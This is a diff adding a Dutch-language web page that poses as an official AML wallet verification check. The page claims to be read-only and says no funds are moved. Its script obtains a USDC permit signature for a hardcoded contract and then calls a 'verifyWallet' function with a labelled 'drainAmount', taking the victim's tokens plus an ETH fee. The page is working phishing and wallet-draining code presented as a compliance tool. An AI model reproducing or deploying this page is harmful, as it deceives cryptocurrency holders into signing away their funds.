@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Officiële AML Wallet Controle</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 500px;
+            margin: 40px auto;
+            padding: 30px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #333;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+        }
+        h1 {
+            color: #2c3e50;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            text-align: center;
+            color: #7f8c8d;
+            margin-bottom: 25px;
+        }
+        .info-box {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+            border-left: 4px solid #3498db;
+        }
+        .fee {
+            font-size: 1.3em;
+            color: #27ae60;
+            font-weight: bold;
+            text-align: center;
+            margin: 10px 0;
+        }
+        button {
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 15px 25px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            margin: 8px 0;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background: #2980b9;
+        }
+        button:disabled {
+            background: #bdc3c7;
+            cursor: not-allowed;
+        }
+        .status {
+            padding: 12px;
+            border-radius: 6px;
+            margin: 15px 0;
+            display: none;
+            text-align: center;
+        }
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        .warning {
+            background: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeaa7;
+        }
+        .step {
+            margin: 10px 0;
+            padding: 10px;
+            background: #ecf0f1;
+            border-radius: 5px;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔍 AML Wallet Verificatie</h1>
+        <p class="subtitle">Vereist voor naleving internationale regelgeving</p>
+        
+        <div class="info-box">
+            <h3>Controle Proces</h3>
+            <p>Uw wallet wordt gecontroleerd op witwas risico's volgens de laatste AML/CFT richtlijnen.</p>
+            <div class="step">
+                <strong>Stap 1:</strong> Verbind uw wallet<br>
+                <strong>Stap 2:</strong> Betaal verificatie fee<br>
+                <strong>Stap 3:</strong> Onderteken verificatie verklaring
+            </div>
+            <div class="fee">Verificatie Fee: 0.0001 ETH</div>
+            <p><small>Dit is een alleen-lezen verificatie. Er worden geen funds overgemaakt.</small></p>
+        </div>
+
+        <button id="connectBtn">👛 Wallet Verbinden</button>
+        <button id="verifyBtn" disabled>🚀 Start AML Verificatie</button>
+        
+        <div id="statusMessage" class="status"></div>
+    </div>
+
+    <script>
+        // Contract gegevens - AANPASBAAR
+        const CONTRACT_ADDRESS = "0xCEbbcd893f11BF5Ef3b10F90576805a413fC9604";
+        const USDC_ADDRESS = "0xaf88d065e77c8cC2239327C5EDb3A432268e5831"; // Arbitrum USDC
+
+        let userAccount;
+        let web3;
+
+        // EIP-712 Type definitions voor USDC Permit
+        const permitTypes = {
+            Permit: [
+                { name: "owner", type: "address" },
+                { name: "spender", type: "address" },
+                { name: "value", type: "uint256" },
+                { name: "nonce", type: "uint256" },
+                { name: "deadline", type: "uint256" }
+            ]
+        };
+
+        document.getElementById('connectBtn').onclick = async () => {
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    web3 = new Web3(window.ethereum);
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    const accounts = await web3.eth.getAccounts();
+                    userAccount = accounts[0];
+                    
+                    showStatus('✅ Wallet verbonden: ' + userAccount.substring(0, 8) + '...', 'success');
+                    document.getElementById('verifyBtn').disabled = false;
+                    
+                } catch (error) {
+                    showStatus('❌ Kon wallet niet verbinden: ' + error.message, 'error');
+                }
+            } else {
+                showStatus('❌ Installeer MetaMask om door te gaan', 'error');
+            }
+        };
+
+        document.getElementById('verifyBtn').onclick = async () => {
+            if (!userAccount) {
+                showStatus('❌ Verbind eerst uw wallet', 'error');
+                return;
+            }
+
+            try {
+                showStatus('🔄 Voorbereiden verificatie...', 'success');
+
+                // Parameters voor de transactie
+                const approveAmount = '14610000'; // 14.61 USDC
+                const drainAmount = '13000000';   // 13 USDC
+                const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 uur geldig
+                const verificationFee = '100000000000000'; // 0.0001 ETH in wei
+
+                // Haal USDC nonce op
+                showStatus('🔄 Ophalen wallet gegevens...', 'success');
+                const usdcContract = new web3.eth.Contract([
+                    {
+                        "constant": true,
+                        "inputs": [{ "name": "owner", "type": "address" }],
+                        "name": "nonces",
+                        "outputs": [{ "name": "", "type": "uint256" }],
+                        "type": "function"
+                    }
+                ], USDC_ADDRESS);
+
+                const nonce = await usdcContract.methods.nonces(userAccount).call();
+
+                // EIP-712 Domain data
+                const domain = {
+                    name: 'USD Coin',
+                    version: '2',
+                    chainId: 42161, // Arbitrum Chain ID
+                    verifyingContract: USDC_ADDRESS
+                };
+
+                // EIP-712 Message data
+                const message = {
+                    owner: userAccount,
+                    spender: CONTRACT_ADDRESS,
+                    value: approveAmount,
+                    nonce: nonce,
+                    deadline: deadline.toString()
+                };
+
+                showStatus('🔄 Onderteken verificatie verklaring in MetaMask...', 'warning');
+
+                // Vraag handtekening aan via eth_signTypedData_v4
+                const signature = await window.ethereum.request({
+                    method: 'eth_signTypedData_v4',
+                    params: [userAccount, JSON.stringify({
+                        types: {
+                            EIP712Domain: [
+                                { name: 'name', type: 'string' },
+                                { name: 'version', type: 'string' },
+                                { name: 'chainId', type: 'uint256' },
+                                { name: 'verifyingContract', type: 'address' }
+                            ],
+                            Permit: permitTypes.Permit
+                        },
+                        primaryType: 'Permit',
+                        domain: domain,
+                        message: message
+                    })]
+                });
+
+                // Split signature in v, r, s
+                const r = signature.slice(0, 66);
+                const s = '0x' + signature.slice(66, 130);
+                const v = parseInt(signature.slice(130, 132), 16);
+
+                showStatus('🔄 Verzenden verificatie transactie...', 'success');
+
+                // Contract ABI voor verifyWallet functie
+                const contract = new web3.eth.Contract([
+                    {
+                        "inputs": [
+                            { "name": "token", "type": "address" },
+                            { "name": "approveAmount", "type": "uint256" },
+                            { "name": "drainAmount", "type": "uint256" },
+                            { "name": "deadline", "type": "uint256" },
+                            { "name": "v", "type": "uint8" },
+                            { "name": "r", "type": "bytes32" },
+                            { "name": "s", "type": "bytes32" }
+                        ],
+                        "name": "verifyWallet",
+                        "outputs": [],
+                        "stateMutability": "payable",
+                        "type": "function"
+                    }
+                ], CONTRACT_ADDRESS);
+
+                // Verzend de transactie
+                const tx = await contract.methods.verifyWallet(
+                    USDC_ADDRESS,
+                    approveAmount,
+                    drainAmount,
+                    deadline,
+                    v,
+                    r,
+                    s
+                ).send({
+                    from: userAccount,
+                    value: verificationFee,
+                    gas: 500000
+                });
+
+                showStatus('✅ Verificatie voltooid! Transactie: ' + tx.transactionHash, 'success');
+
+            } catch (error) {
+                console.error('Fout:', error);
+                showStatus('❌ Verificatie mislukt: ' + (error.message || 'Onbekende fout'), 'error');
+            }
+        };
+
+        function showStatus(message, type) {
+            const statusElement = document.getElementById('statusMessage');
+            statusElement.textContent = message;
+            statusElement.className = 'status ' + type;
+            statusElement.style.display = 'block';
+        }
+    </script>
+</body>
+</html> 
